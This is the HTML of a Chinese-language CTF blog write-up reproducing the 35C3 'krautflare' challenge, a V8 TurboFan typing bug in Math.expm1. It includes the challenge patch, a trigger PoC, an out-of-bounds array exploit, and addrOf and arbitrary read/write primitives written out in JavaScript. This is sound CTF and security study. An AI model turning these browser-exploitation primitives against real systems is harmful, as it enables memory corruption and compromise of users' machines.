@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="35c3 krautflare复现，一道由Math.expm1()的相关漏洞改编的题目。">
+<meta name="keywords" content="exploit,Browser">
+<meta property="og:type" content="article">
+<meta property="og:title" content="35c3 krautflare">
+<meta property="og:url" content="http://yoursite.com/2020/07/07/35c3-krautflare/index.html">
+<meta property="og:site_name" content="cd &#x2F;pwn">
+<meta property="og:description" content="35c3 krautflare复现，一道由Math.expm1()的相关漏洞改编的题目。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2020/07/07/35c3-krautflare/000.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/07/35c3-krautflare/001.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/07/35c3-krautflare/002.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/07/35c3-krautflare/003.png">
+<meta property="og:updated_time" content="2020-07-07T06:31:03.649Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="35c3 krautflare">
+<meta name="twitter:description" content="35c3 krautflare复现，一道由Math.expm1()的相关漏洞改编的题目。">
+<meta name="twitter:image" content="http://yoursite.com/2020/07/07/35c3-krautflare/000.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2020/07/07/35c3-krautflare/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>35c3 krautflare | cd /pwn</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cd /pwn</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/07/35c3-krautflare/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Eros John">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cd /pwn">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">35c3 krautflare
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-07-07 12:10:13 / 修改时间：14:31:03" itemprop="dateCreated datePublished" datetime="2020-07-07T12:10:13+08:00">2020-07-07</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Browser/" itemprop="url" rel="index"><span itemprop="name">Browser</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Browser/v8/" itemprop="url" rel="index"><span itemprop="name">v8</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>35c3 krautflare复现，一道由Math.expm1()的相关漏洞改编的题目。</p>
+<a id="more"></a>
+<hr>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>题目相关文件可以在<a href="https://35c3ctf.ccc.ac/uploads/krautflare-33ce1021f2353607a9d4cc0af02b0b28.tar" target="_blank" rel="noopener">这里</a>下载到。<br>解压文件后可以直接通过相关脚本搭建环境，也可以修改部分脚本，编译debug版本的v8以方便调试。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><p>对于<code>revert-bugfix-880207.patch</code><br><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">commit 950e28228cefd1266cf710f021a67086e67ac6a6</span><br><span class="line">Author: Your Name &lt;you@example.com&gt;</span><br><span class="line">Date:   Sat Dec 15 14:59:37 2018 +0100</span><br><span class="line"></span><br><span class="line">    Revert "[turbofan] Fix Math.expm1 builtin typing."</span><br><span class="line">    </span><br><span class="line">    This reverts commit c59c9c46b589deb2a41ba07cf87275921b8b2885.</span><br><span class="line"></span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index 60e7ed574a..8324dc06d7 100644</span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line">@@ -1491,6 +1491,7 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">     // Unary math functions.</span><br><span class="line">     case BuiltinFunctionId::kMathAbs:</span><br><span class="line">     case BuiltinFunctionId::kMathExp:</span><br><span class="line"><span class="addition">+    case BuiltinFunctionId::kMathExpm1:</span></span><br><span class="line">       return Type::Union(Type::PlainNumber(), Type::NaN(), t-&gt;zone());</span><br><span class="line">     case BuiltinFunctionId::kMathAcos:</span><br><span class="line">     case BuiltinFunctionId::kMathAcosh:</span><br><span class="line">@@ -1500,7 +1501,6 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">     case BuiltinFunctionId::kMathAtanh:</span><br><span class="line">     case BuiltinFunctionId::kMathCbrt:</span><br><span class="line">     case BuiltinFunctionId::kMathCos:</span><br><span class="line"><span class="deletion">-    case BuiltinFunctionId::kMathExpm1:</span></span><br><span class="line">     case BuiltinFunctionId::kMathFround:</span><br><span class="line">     case BuiltinFunctionId::kMathLog:</span><br><span class="line">     case BuiltinFunctionId::kMathLog1p:</span><br><span class="line">diff --git a/test/mjsunit/regress/regress-crbug-880207.js b/test/mjsunit/regress/regress-crbug-880207.js</span><br><span class="line">index 09796a9ff4..0f65ddb56b 100644</span><br><span class="line"><span class="comment">--- a/test/mjsunit/regress/regress-crbug-880207.js</span></span><br><span class="line"><span class="comment">+++ b/test/mjsunit/regress/regress-crbug-880207.js</span></span><br><span class="line"><span class="meta">@@ -4,34 +4,10 @@</span></span><br><span class="line"> </span><br><span class="line"> // Flags: --allow-natives-syntax</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-(function TestOptimizedFastExpm1MinusZero() &#123;</span></span><br><span class="line"><span class="deletion">-  function foo() &#123;</span></span><br><span class="line"><span class="deletion">-    return Object.is(Math.expm1(-0), -0);</span></span><br><span class="line"><span class="deletion">-  &#125;</span></span><br><span class="line"><span class="addition">+function foo() &#123;</span></span><br><span class="line"><span class="addition">+  return Object.is(Math.expm1(-0), -0);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="deletion">-  assertTrue(foo());</span></span><br><span class="line"><span class="deletion">-  %OptimizeFunctionOnNextCall(foo);</span></span><br><span class="line"><span class="deletion">-  assertTrue(foo());</span></span><br><span class="line"><span class="deletion">-&#125;)();</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-(function TestOptimizedExpm1MinusZeroSlowPath() &#123;</span></span><br><span class="line"><span class="deletion">-  function f(x) &#123;</span></span><br><span class="line"><span class="deletion">-    return Object.is(Math.expm1(x), -0);</span></span><br><span class="line"><span class="deletion">-  &#125;</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-  function g() &#123;</span></span><br><span class="line"><span class="deletion">-    return f(-0);</span></span><br><span class="line"><span class="deletion">-  &#125;</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-  f(0);</span></span><br><span class="line"><span class="deletion">-  // Compile function optimistically for numbers (with fast inlined</span></span><br><span class="line"><span class="deletion">-  // path for Math.expm1).</span></span><br><span class="line"><span class="deletion">-  %OptimizeFunctionOnNextCall(f);</span></span><br><span class="line"><span class="deletion">-  // Invalidate the optimistic assumption, deopting and marking non-number</span></span><br><span class="line"><span class="deletion">-  // input feedback in the call IC.</span></span><br><span class="line"><span class="deletion">-  f("0");</span></span><br><span class="line"><span class="deletion">-  // Optimize again, now with non-lowered call to Math.expm1.</span></span><br><span class="line"><span class="deletion">-  assertTrue(g());</span></span><br><span class="line"><span class="deletion">-  %OptimizeFunctionOnNextCall(g);</span></span><br><span class="line"><span class="deletion">-  assertTrue(g());</span></span><br><span class="line"><span class="deletion">-&#125;)();</span></span><br><span class="line"><span class="addition">+assertTrue(foo());</span></span><br><span class="line"><span class="addition">+%OptimizeFunctionOnNextCall(foo);</span></span><br><span class="line"><span class="addition">+assertTrue(foo());</span></span><br></pre></td></tr></table></figure></p>
+<p>在<code>typer.cc</code>文件中，可以发现<code>Math.expm1()</code>返回的<code>type</code>为<code>Union(PlainNumber, NaN)</code>。</p>
+<pre><code>d8&gt; Object.is(0, -0)
+false
+</code></pre><p>我们可以发现，在<code>v8</code>中，<code>0</code>和<code>-0</code>是不同的。其中<code>-0</code>的<code>type</code>为<code>HEAP_NUMBER_TYPE</code>，代表着浮点数。<br>而<code>PlainNumber</code>则代表除了<code>-0</code>以外的所有浮点数。<br>所以<code>typer</code>在处理<code>Math.expm1</code>的时候没有考虑到传入<code>-0</code>的情况。</p>
+<h2 id="Trigger"><a href="#Trigger" class="headerlink" title="Trigger"></a>Trigger</h2><p>由前面的代码可知，<code>typer</code>在处理<code>Math.expm1</code>，返回为<code>PlainNumber</code>和<code>NaN</code>。所以<code>Object.is(Math.expm1(x), -0)</code>的返回值应该一直为<code>false</code>。我们通过以下代码进行验证。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> bool = <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(x), <span class="number">-0</span>);</span><br><span class="line">    <span class="keyword">return</span> bool;</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"foo(0)  : "</span> + foo(<span class="number">0</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">print(<span class="string">"foo(-0) : "</span> + foo(<span class="number">-0</span>));</span><br></pre></td></tr></table></figure>
+<pre><code>foo(0)  : false
+foo(-0) : true
+</code></pre><p>得到的返回值显然和预料中的不一样，通过<code>Turbolizer</code>观察一下。<br><img src="/2020/07/07/35c3-krautflare/000.png" alt="000"><br>在<code>simplified lowering</code>中发现<code>Math.expm1</code>被替换为<code>Float64Expm1</code>，为了触发bug，我们需要添加<code>foo(&quot;0&quot;)</code>接受String类型参数，以此触发更底层的<code>Call</code>。</p>
+<p>所以将POC改为以下代码。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> bool = <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(x), <span class="number">-0</span>);</span><br><span class="line">    <span class="keyword">return</span> bool;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(<span class="string">"foo(0)  : "</span> + foo(<span class="number">0</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">print(<span class="string">"foo(-0) : "</span> + foo(<span class="number">-0</span>));</span><br><span class="line">foo(<span class="string">"0"</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">print(<span class="string">"After Optimize"</span>);</span><br><span class="line">print(<span class="string">"foo(0)  : "</span> + foo(<span class="number">0</span>));</span><br><span class="line">print(<span class="string">"foo(-0) : "</span> + foo(<span class="number">-0</span>));</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/07/35c3-krautflare/001.png" alt="001"><br>可以看到图中返回值为<code>false</code>。</p>
+<h2 id="OOB"><a href="#OOB" class="headerlink" title="OOB"></a>OOB</h2><p>在上面<code>Trigger</code>中，我们能够得到固定的返回值<code>false</code>，再将其转化为数字，<code>Turbofan</code>会将其认为<code>0</code>，在<code>simplified lowering</code>阶段会去掉<code>CheckBounds</code>。但实际存在1的情况，由此触发<code>OOB</code>。<br>我们在<code>v8</code>中运行以下代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> oobArray = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line">    <span class="keyword">let</span> idx = <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(x), <span class="number">-0</span>);</span><br><span class="line">    idx *= <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">return</span> oobArray[idx];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(<span class="string">"foo(0)  : "</span>+foo(<span class="number">0</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">foo(<span class="string">"0"</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">print(<span class="string">"After Optimize"</span>);</span><br><span class="line">print(<span class="string">"foo(0)  : "</span>+foo(<span class="number">0</span>));</span><br><span class="line">print(<span class="string">"foo(-0) : "</span>+foo(<span class="number">-0</span>));</span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure></p>
+<p>我们得到的结果都是<code>oobArray[0]</code>，说明<code>idx</code>一直为<code>0</code>。<br><img src="/2020/07/07/35c3-krautflare/002.png" alt="002"><br>在<code>Typer</code>阶段中，<code>idx</code>被替换为了<code>0</code>。<br>所以我们要找一种在<code>simplified lowering</code>都不会影响到BUG触发的方法，可以考虑<code>simplified lowering</code>的前一个阶段<code>escape analysis</code>。<br>我们可以把值放在非逃逸对象中以避免<code>Typer</code>阶段<code>idx</code>的替换。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">let</span> tmp = &#123;<span class="attr">escape</span> : <span class="number">-0</span>&#125;;</span><br><span class="line">	<span class="keyword">let</span> idx = <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(x), tmp.escape);</span><br><span class="line">	idx *= <span class="number">11</span>;</span><br><span class="line">	<span class="keyword">let</span> a = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line">	<span class="comment">// let b = [2.1, 2.2, 2.3];</span></span><br><span class="line">	<span class="comment">// oobArray = b;</span></span><br><span class="line">	<span class="comment">// a[idx] = tC.u2f(0x200000000000);</span></span><br><span class="line">	<span class="keyword">return</span> a[idx];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(<span class="string">"foo(0)  : "</span>+foo(<span class="number">0</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">foo(<span class="string">"0"</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">print(<span class="string">"foo(0)  : "</span>+foo(<span class="number">0</span>));</span><br><span class="line">print(<span class="string">"foo(-0) : "</span>+foo(<span class="number">-0</span>));</span><br></pre></td></tr></table></figure></p>
+<pre><code>foo(0)  : 1.1
+foo(0)  : 1.1
+foo(-0) : -1.1885946300594787e+148
+</code></pre><p>在<code>escape analysis</code>阶段之前，<code>tmp.escape</code>以及<code>tmp</code>的类型都是不知道的，<code>escape analysis</code>阶段将<code>tmp.escape</code>替换为<code>NumberConstant[-0]</code>，接着在<code>simplified lowering</code>中的<code>typer</code>阶段，<code>tmp.escape</code>的<code>typer</code>被收集，由于<code>Turbofan</code>认为<code>idx</code>肯定为<code>0</code>，所以去除了<code>CheckBounds</code>，成功实现了<code>OOB</code>。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="稳定的OOB"><a href="#稳定的OOB" class="headerlink" title="稳定的OOB"></a>稳定的OOB</h2><p>这一步可以通过申请两个数组，通过第一个数组触发<code>OOB</code>来修改第二个数组的<code>length</code>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> oobArray = <span class="literal">undefined</span>;</span><br><span class="line"><span class="keyword">var</span> bufs = [];</span><br><span class="line"><span class="keyword">var</span> objs = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">let</span> tmp = &#123;<span class="attr">escape</span> : <span class="number">-0</span>&#125;;</span><br><span class="line">	<span class="keyword">let</span> idx = <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(x), tmp.escape);</span><br><span class="line">	idx *= <span class="number">11</span>;</span><br><span class="line">	<span class="keyword">let</span> a = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line">	<span class="keyword">let</span> b = [<span class="number">2.1</span>, <span class="number">2.2</span>, <span class="number">2.3</span>];</span><br><span class="line">	oobArray = b;</span><br><span class="line">	a[idx] = tC.u2f(<span class="number">0x200000000000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="AddrOf-amp-R-W"><a href="#AddrOf-amp-R-W" class="headerlink" title="AddrOf &amp; R/W"></a>AddrOf &amp; R/W</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xdead</span>);</span><br><span class="line"><span class="keyword">let</span> obj=&#123;<span class="string">'a'</span>:<span class="number">0x1234</span>,<span class="string">'b'</span>:<span class="number">0x5678</span>&#125;;</span><br><span class="line"><span class="comment">//------------search-------------</span></span><br><span class="line"><span class="keyword">let</span> obj_b_offset;</span><br><span class="line"><span class="comment">// search obj.b offset</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i &lt; maxSize; i++)&#123;</span><br><span class="line">	<span class="keyword">let</span> val = tC.f2u(oobArray[i]);</span><br><span class="line">	<span class="keyword">if</span>(val === <span class="number">0x123400000000</span>)&#123;</span><br><span class="line">		obj_b_offset = i + <span class="number">1</span>;</span><br><span class="line">		success(<span class="string">"obj.b"</span>, obj_b_offset);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// search buf's backing_store</span></span><br><span class="line"><span class="keyword">let</span> backing_store;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;maxSize;i++)&#123;</span><br><span class="line">	<span class="keyword">let</span> = val = tC.f2u(oobArray[i]);</span><br><span class="line">	<span class="keyword">if</span>(val === <span class="number">0xdead</span>)&#123;</span><br><span class="line">		backing_store = i + <span class="number">1</span>;</span><br><span class="line">		success(<span class="string">"buf's backing_store offset in oobArray"</span>,backing_store);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------build R/W Primitive-------------</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArbitraryRW</span></span>&#123;</span><br><span class="line">	leakObj(target)&#123;</span><br><span class="line">		obj.b = target;</span><br><span class="line">		<span class="keyword">return</span> tC.f2u(oobArray[obj_b_offset]) - <span class="number">0x1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	read(addr)&#123;</span><br><span class="line">		oobArray[backing_store] = tC.u2f(addr);</span><br><span class="line">		<span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line">		<span class="keyword">return</span> tC.f2u(tmp[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	write(addr,value)&#123;</span><br><span class="line">		oobArray[backing_store] = tC.u2f(addr);</span><br><span class="line">		<span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line">		tmp[<span class="number">0</span>] = tC.u2f(value);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过创建一个<code>ArrayBuffer</code>以及一个<code>obj</code>来实现<code>Addrof(leakObj)</code>，以及<code>ArbitraryRW</code>。</p>
